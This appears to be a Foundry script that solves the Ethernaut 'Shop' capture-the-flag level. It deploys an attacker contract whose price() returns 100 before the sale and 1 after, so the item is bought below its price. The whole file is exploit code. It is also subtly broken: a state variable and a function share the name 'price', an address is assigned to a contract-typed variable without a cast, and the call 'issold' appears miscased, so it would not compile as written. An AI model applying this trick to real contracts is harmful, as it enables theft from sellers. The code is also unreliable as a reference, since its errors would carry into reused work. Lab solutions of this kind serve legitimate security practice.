//SPDX-License-Identifer:UNLICENSED
pragma solidity ^0.8.0;

import "../src/Shop.sol";
import "forge-std/Script.sol";

contract AttackBuyer {
    uint public price = 100;
    Shop shop;

    constructor(address _shop) {
        shop = _shop;
    }

    function attack() public {
        shop.buy();
    }

    function price() external view returns(uint256) {
        
        if (!shop.issold()) {
            return 100;
        }
        else {
            return 1;
        }
    }
}

contract ShopSolution is Script {
    Shop shopInstance = Shop(0x0c49511429317D3B4E308Eab5185090c1Fe752BC);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackBuyer attackBuyer = new AttackBuyer(shopInstance);
        attackBuyer.attack();
        vm.stopBroadcast();
    }
}